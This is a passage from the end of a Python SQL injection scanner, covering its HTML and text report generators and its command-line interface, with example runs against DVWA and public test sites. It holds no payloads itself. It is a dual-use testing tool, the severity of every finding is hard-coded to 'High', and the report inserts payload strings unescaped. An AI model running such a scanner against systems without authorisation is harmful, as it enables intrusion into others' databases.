        .tree-node .icon {{ margin-right: 10px; width: 16px; text-align: center; }}
        .tree-node .count-badge {{ margin-left: auto; background: #eee; padding: 2px 8px; border-radius: 12px; font-size: 0.75rem; color: #666; }}
        .tree-group-label {{ font-size: 0.75rem; text-transform: uppercase; color: #999; padding: 15px 20px 5px; font-weight: 600; letter-spacing: 0.5px; }}
        .main-content {{ flex: 1; margin-top: var(--header-height); height: calc(100vh - var(--header-height)); overflow-y: auto; padding: 40px; box-sizing: border-box; }}
        
        .card {{ background: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); padding: 30px; margin-bottom: 25px; }}
        .card h2 {{ margin-top: 0; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 1.5rem; color: #2c3e50; font-weight: 600; }}
        
        .stat-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 20px; margin-bottom: 30px; }}
        .stat-item {{ background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; border: 1px solid #eee; }}
        .stat-value {{ font-size: 2rem; font-weight: 700; color: var(--primary); display: block; margin-bottom: 5px; }}
        .stat-label {{ font-size: 0.85rem; color: #7f8c8d; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }}
        .stat-item.danger .stat-value {{ color: #dc3545; }}
        .stat-item.warning .stat-value {{ color: #fd7e14; }}
        
        .finding-item {{ border: 1px solid #eee; border-radius: 8px; margin-bottom: 20px; overflow: hidden; }}
        .finding-header {{ background: #f8f9fa; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; font-weight: 600; border-bottom: 1px solid #eee; }}
        .finding-body {{ padding: 20px; }}
        
        .badge {{ padding: 4px 8px; border-radius: 4px; font-size: 0.8rem; font-weight: 600; text-transform: uppercase; }}
        .badge-high {{ background: #ffe3e6; color: #dc3545; }}
        .badge-med {{ background: #fff3cd; color: #ffc107; }}
        .badge-low {{ background: #d4edda; color: #28a745; }}
        
        .detail-row {{ display: flex; margin-bottom: 10px; align-items: baseline; }}
        .detail-label {{ width: 120px; font-weight: 600; color: #666; font-size: 0.9rem; }}
        .detail-value {{ flex: 1; font-family: padding: 4px 0; font-size: 0.95rem; }}
        code {{ background: #f1f2f6; padding: 3px 6px; border-radius: 4px; font-family: 'Consolas', monospace; color: #e83e8c; word-break: break-all; font-size: 0.9rem; }}
        
        .empty-state {{ text-align: center; color: #999; padding: 50px; }}
        .empty-icon {{ font-size: 3rem; margin-bottom: 20px; opacity: 0.3; }}
        
        /* Acunetix-like specific styles */
        .vuln-group-header {{ display: flex; align-items: center; margin-bottom: 15px; }}
        .vuln-icon {{ width: 32px; height: 32px; background: #dc3545; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-weight: bold; overflow: hidden; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔍 SQLi Agent Report</h1>
        <div style="margin-left: auto; font-size: 0.9rem; opacity: 0.9;">{summary.scan_start}</div>
    </div>
    
    <div class="sidebar">
        <div class="search-box">
            <input type="text" placeholder="Filter targets..." id="filterInput" onkeyup="filterTree()">
        </div>
        <div class="tree-container" id="treeRoot">
            <!-- Tree generated by JS -->
        </div>
    </div>
    
    <div class="main-content" id="mainContent">
        <!-- Content injected by JS -->
    </div>

    <script>
        const scanData = JSON.parse(atob("{data_b64}"));
        
        // --- 1. Processing Logic ---
        
        function processData(summary) {{
            const findings = summary.findings.filter(f => f.is_vulnerable);
            const urlGroups = {{}};
            
            findings.forEach(f => {{
                // Use original base URL or strip query for aggregation
                const tempUrl = f.original_base_url || f.url;
                const cleanUrl = tempUrl.split('?')[0];
                
                if (!urlGroups[cleanUrl]) {{
                    urlGroups[cleanUrl] = {{
                        url: cleanUrl,
                        params: new Set(),
                        findings: [],
                        maxConfidence: 0,
                        lastSeen: f.timestamp || new Date().toISOString()
                    }};
                }}
                
                urlGroups[cleanUrl].params.add(f.parameter);
                urlGroups[cleanUrl].findings.push(f);
                urlGroups[cleanUrl].maxConfidence = Math.max(urlGroups[cleanUrl].maxConfidence, f.confidence);
            }});
            
            return Object.values(urlGroups);
        }}
        
        const processedGroups = processData(scanData);
        let activeNode = 'summary';

        // --- 2. Render Functions ---

        function renderIcon(type) {{
            if (type === 'global') return '🌐';
            if (type === 'infrastructure') return '🔧';
            if (type === 'url') return '📄';
            if (type === 'summary') return '📊';
            return '•';
        }}

        function renderTree() {{
            const root = document.getElementById('treeRoot');
            root.innerHTML = '';
            
            // Summary Node
            const sumDiv = document.createElement('div');
            sumDiv.className = `tree-node ${{activeNode === 'summary' ? 'active' : ''}}`;
            sumDiv.innerHTML = `<span class="icon">📊</span> Scan Summary`;
            sumDiv.onclick = () => showSummary();
            root.appendChild(sumDiv);
            
            // URL Nodes
            if (processedGroups.length > 0) {{
                const label = document.createElement('div');
                label.className = 'tree-group-label';
                label.innerText = 'Vulnerable Pages';
                root.appendChild(label);
                
                // Sort by URL
                processedGroups.sort((a, b) => a.url.localeCompare(b.url));
                
                processedGroups.forEach(group => {{
                    const uDiv = document.createElement('div');
                    uDiv.className = `tree-node ${{activeNode === group.url ? 'active' : ''}}`;
                    // Truncate URL for display
                    const displayUrl = group.url.replace(scanData.target_url, '/');
                    uDiv.innerHTML = `<span class="icon">📄</span> ${{displayUrl}} <span class="count-badge">${{group.params.size}}</span>`;
                    uDiv.onclick = () => showUrl(group.url);
                    root.appendChild(uDiv);
                }});
            }}
        }}
        
        function showSummary() {{
            activeNode = 'summary';
            renderTree();
            const content = document.getElementById('mainContent');
            
            content.innerHTML = `
                <div class="card">
                    <h2>📊 Scan Summary</h2>
                    <div class="stat-grid">
                        <div class="stat-item danger">
                            <span class="stat-value">${{scanData.unique_findings}}</span>
                            <span class="stat-label">Unique Vulns</span>
                        </div>
                        <div class="stat-item warning">
                            <span class="stat-value">${{scanData.vulnerable_urls}}</span>
                            <span class="stat-label">Vulnerable URLs</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-value">${{scanData.urls_scanned}}</span>
                            <span class="stat-label">Pages Scanned</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-value">${{scanData.duration_minutes.toFixed(2)}}m</span>
                            <span class="stat-label">Duration</span>
                        </div>
                    </div>
                    
                    <h3>Configuration</h3>
                    <div class="detail-row"><div class="detail-label">Target:</div> <div class="detail-value"><a href="${{scanData.target_url}}" target="_blank">${{scanData.target_url}}</a></div></div>
                    <div class="detail-row"><div class="detail-label">Start Time:</div> <div class="detail-value">${{scanData.scan_start}}</div></div>
                    <div class="detail-row"><div class="detail-label">Total Tests:</div> <div class="detail-value">${{scanData.total_payloads_tested}}</div></div>
                </div>
                
                ${{renderDashboardTable()}}
            `;
        }}

        function renderDashboardTable() {{
            // Flatten all findings into (URL + Parameter) items
            const flatItems = [];
            
            // Create a temporary map to group by (URL+Param)
            const paramMap = new Map();
            
            // Iterate over all findings from processedGroups (which ensures we use the processed/filtered data)
            processedGroups.forEach(group => {{
                group.findings.forEach(f => {{
                    // Use Clean URL for Grouping Key (Merge different payloads)
                    const tempUrl = f.original_base_url || f.url;
                    const cleanUrl = tempUrl.split('?')[0];
                    const key = cleanUrl + '|' + f.parameter;
                    
                    if (!paramMap.has(key)) {{
                        paramMap.set(key, {{
                            url: cleanUrl,
                            parameter: f.parameter,
                            confidence: f.confidence,
                            types: new Set(f.payload_types || (f.payload_type ? [f.payload_type] : []))
                        }});
                    }} else {{
                        const item = paramMap.get(key);
                        item.confidence = Math.max(item.confidence, f.confidence);
                        // Merge payload types
                        const newTypes = f.payload_types || (f.payload_type ? [f.payload_type] : []);
                        newTypes.forEach(t => item.types.add(t));
                    }}
                }});
            }});
            
            flatItems.push(...paramMap.values());
            
            let html = `
            <div class="card">
                <h2>⚠️ Vulnerability Findings</h2>
                <table style="width:100%; border-collapse: collapse; margin-top: 10px; font-size: 0.9rem;">
                    <thead>
                        <tr style="background: #f8f9fa; border-bottom: 2px solid #dee2e6; text-align: left;">
                            <th style="padding: 12px;">Severity</th>
                            <th style="padding: 12px;">Vulnerability</th>
                            <th style="padding: 12px;">URL</th>
                            <th style="padding: 12px;">Parameter</th>
                            <th style="padding: 12px;">Payload Types</th>
                            <th style="padding: 12px;">Confidence %</th>
                        </tr>
                    </thead>
                    <tbody>
            `;
            
            if (flatItems.length === 0) {{
                 html += '<tr><td colspan="6" style="padding: 20px; text-align: center; color: #777;">No vulnerabilities found.</td></tr>';
            }} else {{
                 // Sort by max confidence
                 flatItems.sort((a, b) => b.confidence - a.confidence);
                 
                 flatItems.forEach(item => {{
                     const pct = Math.round(item.confidence * 100);
                     const typeList = Array.from(item.types).join(', ');
                     
                     // Determine Severity based on MAX confidence
                     // FIX: User requested forced "High" severity for all findings
                     let badgeClass = "badge-high"; 
                     let badgeText = "High";
                     
                     // if (item.confidence >= 0.8) {{
                     //     badgeClass = "badge-high"; badgeText = "High";
                     // }} else if (item.confidence >= 0.6) {{
                     //     badgeClass = "badge-med"; badgeText = "Medium";
                     // }}
                     
                     html += `
                        <tr style="border-bottom: 1px solid #eee;">
                            <td style="padding: 12px;"><span class="badge ${{badgeClass}}">${{badgeText}}</span></td>
                            <td style="padding: 12px;">SQL Injection</td>
                             <td style="padding: 12px;"><a href="${{item.url}}" target="_blank" style="color:var(--primary); text-decoration:none;">${{item.url.split('?')[0]}}</a></td>
                            <td style="padding: 12px;"><code>${{item.parameter}}</code></td>
                            <td style="padding: 12px;">${{typeList}}</td>
                            <td style="padding: 12px;">${{pct}}%</td>
                        </tr>
                     `;
                 }});
            }}
            
            html += `
                    </tbody>
                </table>
            </div>
            `;
            return html;
        }}
        
        function renderFindingCard(finding, isGlobal = false) {{
            const pct = Math.round(finding.confidence * 100);
            return `
                <div class="finding-item">
                    <div class="finding-header">
                        <span>${{isGlobal ? 'Global Parameter Issue' : 'SQL Injection'}}</span>
                        <span class="badge badge-high">Conf: ${{pct}}%</span>
                    </div>
                    <div class="finding-body">
                        ${{isGlobal ? `<div style="background:#fff3cd; color: #856404; padding: 10px; margin-bottom: 15px; border-radius: 4px;">⚠️ <b>Global Finding:</b> The parameter <code>${{finding.parameter}}</code> was found vulnerable on <b>${{finding.count}}</b> different pages. This suggests a systemic issue in middleware or global code logic.</div>` : ''}}
                        
                        <div class="detail-row"><div class="detail-label">URL:</div> <div class="detail-value"><a href="${{finding.url}}" target="_blank">${{finding.url}}</a></div></div>
                        <div class="detail-row"><div class="detail-label">Parameter:</div> <div class="detail-value"><code>${{finding.parameter}}</code></div></div>
                        <div class="detail-row"><div class="detail-label">Payload:</div> <div class="detail-value"><code>${{finding.payload}}</code></div></div>
                        <div class="detail-row"><div class="detail-label">Evidence:</div> <div class="detail-value">${{finding.evidence.join('<br>')}}</div></div>
                        
                        ${{finding.full_request ? `
                        <details style="margin-top: 15px;">
                            <summary style="cursor: pointer; color: var(--primary);">View Validated Request/Response</summary>
                            <div style="margin-top: 10px;">
                                <strong>Request:</strong>
                                <pre style="background:#f8f9fa; padding:10px; font-size:0.8rem; overflow-x:auto;">${{escapeHtml(finding.full_request)}}</pre>
                            </div>
                        </details>` : ''}}
                    </div>
                </div>
            `;
        }}
        



        
        function showUrl(url) {{
            activeNode = url;
            renderTree();
            const content = document.getElementById('mainContent');
            
            const group = processedGroups.find(g => g.url === url);
            const findings = group ? group.findings : [];
            
            const items = findings.map(f => renderFindingCard(f)).join('');
            content.innerHTML = `<div class="card"><h2>📄 ${{url}}</h2>${{items}}</div>`;
        }}

        function escapeHtml(text) {{
            if (!text) return '';
            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
        }}

        // Initialize
        showSummary();

    </script>
</body>
</html>
"""

    def write_text_report(self, summary: ScanSummary) -> None:
        """Write detailed text report with grouped findings."""
        with open(self.text_output, 'w', encoding='utf-8') as f:
            # Header
            f.write("="*120 + "\n")
            f.write("SQL INJECTION VULNERABILITY SCAN REPORT\n")
            f.write("="*120 + "\n\n")
            
            # Summary Section
            f.write("SCAN SUMMARY\n")
            f.write("="*120 + "\n")
            
            mins = int(summary.duration_minutes)
            secs = summary.duration_seconds % 60
            f.write(f"Target URL: {summary.target_url}\n")
            f.write(f"Scan Start: {summary.scan_start}\n")
            f.write(f"Scan End: {summary.scan_end}\n")
            f.write(f"Scan Duration: {mins}m {secs:.2f}s ({summary.duration_minutes:.2f} minutes)\n\n")
            
            f.write(f"URLs discovered: {summary.urls_discovered}\n")
            f.write(f"URLs scanned: {summary.urls_scanned}\n")
            f.write(f"Vulnerable URLs (unique): {summary.vulnerable_urls}\n\n")
            
            f.write(f"Total parameters tested: {summary.total_parameters}\n")
            f.write(f"Total tests performed: {summary.total_payloads_tested}\n\n")
            
            # Vulnerability Statistics
            f.write("VULNERABILITY STATISTICS:\n")
            f.write(f"Total payloads that triggered vulnerabilities: {summary.total_findings}\n")
            f.write(f"Unique vulnerable URLs found: {summary.unique_findings}\n")
            f.write(f"  - Likely vulnerable: {summary.likely_vulnerable}\n")
            f.write(f"  - Possibly vulnerable: {summary.possibly_vulnerable}\n\n")
            
            # Vulnerable URLs List
            if summary.vulnerable_urls_list:
                f.write("VULNERABLE URLs:\n")
                for url in summary.vulnerable_urls_list:
                    f.write(f"  • {url}\n")
                f.write("\n")
            
            # Detailed Findings - Grouped by URL
            vulnerable_findings = [finding for finding in summary.findings if finding.is_vulnerable]
            if vulnerable_findings:
                from collections import defaultdict
                
                # Smart Grouping: Identify Global Vulnerabilities
                param_url_map = defaultdict(set)
                for finding in vulnerable_findings:
                     param_url_map[finding.parameter].add(finding.url)
                
                global_params = {param for param, urls in param_url_map.items() if len(urls) > 5}
                
                if global_params:
                     f.write("\n" + "="*120 + "\n")
                     f.write("GLOBAL VULNERABILITIES (Detected on >5 pages)\n")
                     f.write("="*120 + "\n")
                     for param in global_params:
                          url_count = len(param_url_map[param])
                          f.write(f"\n[!] Parameter '{param}' appears vulnerable on {url_count} different URLs.\n")
                          f.write(f"    This likely indicates a global vulnerability (e.g., logging middleware or header processing).\n")
                          f.write(f"    Findings for this parameter are excluded from the detailed list below to reduce noise.\n")

                # Group findings by unique URL
                url_findings = defaultdict(list)
                for finding in vulnerable_findings:
                    # Skip global params in detailed list
                    if finding.parameter in global_params:
                        continue
                        
                    url_key = finding.get_vulnerable_url_key()
                    url_findings[url_key].append(finding)
                
                if not url_findings and self.unique_vulnerable_urls:
                    f.write("\n" + "="*120 + "\n")
                    f.write(f"\n[i] All {len(self.unique_vulnerable_urls)} vulnerable URLs matched Global patterns.\n")
                    f.write("    Please refer to the 'GLOBAL VULNERABILITIES' section above for details.\n")
                    f.write("="*120 + "\n")
                else:
                    f.write("\n" + "="*120 + "\n")
                    f.write("DETAILED VULNERABILITY FINDINGS (Grouped by Unique URL)\n")
                    f.write("="*120 + "\n")

                    # Display each unique URL with its payloads
                    url_count = 0
                    for url_key, findings in url_findings.items():
                        url_count += 1
                        
                        # Get the highest confidence for this URL
                        max_confidence = max(finding.confidence for finding in findings)
                        
                        # Determine severity
                        # FIX: User requested forced "High" severity for all findings
                        severity = "High"
                        # if max_confidence >= 0.8:
                        #     severity = "High"
                        # elif max_confidence >= 0.6:
                        #     severity = "Medium"
                        # else:
                        #     severity = "Low"
                        
                        # Get unique parameters
                        params = set(finding.parameter for finding in findings)
                        params_str = ", ".join(params)
                        
                        # Write URL header
                        f.write(f"\n[{url_count}] {severity} - {url_key}\n")
                        f.write(f"    Parameters: {params_str}\n")
                        f.write(f"    Successful Payloads ({len(findings)}):\n")
                        
                        # Write each successful payload
                        for i, finding in enumerate(findings, 1):
                            payload_display = finding.payload[:60] + "..." if len(finding.payload) > 60 else finding.payload
                            confidence_pct = int(finding.confidence * 100)
                            f.write(f"      {i}. [{finding.parameter}] {payload_display} (Confidence: {confidence_pct}%)\n")
                        
                        f.write("    " + "-"*100 + "\n")
                    
                    f.write(f"\nTotal Unique URLs listed here: {url_count}\n")
                    if len(self.unique_vulnerable_urls) > url_count:
                        f.write(f"(Note: {len(self.unique_vulnerable_urls) - url_count} URLs had only Global vulnerabilities and are summarized in the Global section)\n")
                    f.write("="*120 + "\n")
            
            # Verdict
            verdict_clean = summary.verdict.replace(Fore.RED, "").replace(Fore.YELLOW, "").replace(Fore.GREEN, "").replace(Style.RESET_ALL, "")
            f.write(f"\n{verdict_clean}\n")
            f.write("="*120 + "\n")


# ============================================================================
# CLI INTERFACE
# ============================================================================

def parse_cookies(cookie_str: str) -> Dict[str, str]:
    """Parse cookie string."""
    cookies = {}
    for item in cookie_str.split(';'):
        if '=' in item:
            name, value = item.split('=', 1)
            cookies[name.strip()] = value.strip()
    return cookies


def main():
    """Main CLI entry point."""
    parser = argparse.ArgumentParser(
        description="Enhanced SQL Injection Scanner - Best of Both Worlds",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""{Fore.CYAN}
Examples:
  %(prog)s -u "http://localhost/dvwa/vulnerabilities/sqli/" --csv report.csv
  %(prog)s -u "http://target.com/" --crawl --threads 50 --csv results.csv
  %(prog)s -u "http://dvwa.local/" --dvwa --level low --crawl --output report.json
  %(prog)s -u "http://testphp.vulnweb.com/" --quick --csv quick_scan.csv
        {Style.RESET_ALL}"""
    )
    
    # Required
    parser.add_argument(
        "-u", "--url",
        required=True,
        help="Target URL to scan"
    )
    
    # Scanning options
    parser.add_argument(
        "-c", "--cookie",
        help="Cookies for authenticated scanning"
    )
    
    parser.add_argument("--csv", help="Save results to CSV file")
    parser.add_argument("--text", help="Save detailed text report to file")
    parser.add_argument("--html", help="Save Acunetix-style HTML report to file")
    parser.add_argument(
        "--crawl",
        action="store_true",
        help="Crawl the website for links"
    )
    
    parser.add_argument(
        "--depth",
        type=int,
        default=2,
        help="Maximum crawl depth (default: 2)"
    )
    
    parser.add_argument(
        "--dvwa",
        action="store_true",
        help="Enable DVWA login"
    )
    
    parser.add_argument(
        "--level",
        default="low",
        choices=["low", "medium", "high", "impossible"],
        help="DVWA security level (default: low)"
    )
    
    # Output options
    parser.add_argument(
        "-o", "--output",
        help="Output file for JSON report"
    )
    
    
    # Performance options
    parser.add_argument(
        "-t", "--threads",
        type=int,
        default=3,
        help="Number of concurrent threads (default: 3)"
    )
    
    parser.add_argument(
        "-r", "--rate",
        type=float,
        default=0.4, 
        help="Requests per second limit (default: 0.3)"
    )
    
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Request timeout in seconds (default: 10.0)"
    )
    
    # Scan modes
    parser.add_argument(
        "--quick",
        action="store_true",
        help="Quick scan with reduced payloads"
    )
    
    parser.add_argument(
        "--safe",
        action="store_true",
        help="Skip time-based payloads"
    )
    
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )
    
    
    parser.add_argument(
        "--max-urls",
        type=int,
        default=41,
        help="Maximum URLs to discover (default: 41)"
    )
    
    args = parser.parse_args()
    
    # Banner
    print(f"{Fore.CYAN}Enhanced SQL Injection Scanner - Combining Best Features{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    # print(f"Target: {args.url}")
    # print(f"Started: {datetime.now().isoformat()}")
    # print(f"Crawl depth: {'DEEP' if args.depth > 1 else 'SHALLOW'} ({args.depth})")
    # print(f"Max URLs: {args.max_urls}")
    # print(f"Threads: {args.threads}")
    # print(f"{Fore.CYAN}------------------------------------------------------------{Style.RESET_ALL}")
    
    # Parse cookies
    cookies = parse_cookies(args.cookie) if args.cookie else None
    
    # Create and run scanner
    try:
        scanner = EnhancedSQLiScanner(
            target_url=args.url,
            cookies=cookies,
            threads=args.threads,
            rate_limit=args.rate,
            timeout=args.timeout,
            max_depth=args.depth,
            crawl=args.crawl,
            do_dvwa_login=args.dvwa,
            dvwa_level=args.level,
            output_file=args.output,
            csv_output=Path(args.csv) if args.csv else None,
            text_output=Path(args.text) if args.text else None,
            html_output=Path(args.html) if args.html else None,
            verbose=args.verbose,
            quick_scan=args.quick,
            skip_time_based=args.safe,
            max_urls=args.max_urls
        )
        
        summary = scanner.scan()
        
        # Exit codes based on unique vulnerabilities, not total findings
        if summary.vulnerable_urls > 0:
            sys.exit(2)
        elif summary.total_findings > 0:
            sys.exit(1)
        else:
            sys.exit(0)
            
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Scan interrupted by user.{Style.RESET_ALL}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Fore.RED}Error: {e}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()